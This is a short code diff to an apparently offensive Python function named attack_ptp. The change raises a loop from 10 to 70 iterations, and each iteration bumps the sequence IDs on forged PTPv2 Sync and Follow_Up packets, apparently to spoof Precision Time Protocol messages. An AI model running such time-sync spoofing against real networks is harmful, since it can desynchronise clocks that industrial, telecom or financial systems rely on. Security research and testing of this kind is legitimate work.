@@ -35,7 +35,7 @@ def attack_ptp():
     global follow_up_packet
     global sequence_id
 
-    for i in range(10):
+    for i in range(70):
         sequence_id+=1
         sync_packet[PTPv2].sequenceId = sequence_id
         follow_up_packet[PTPv2].sequenceId = sequence_id
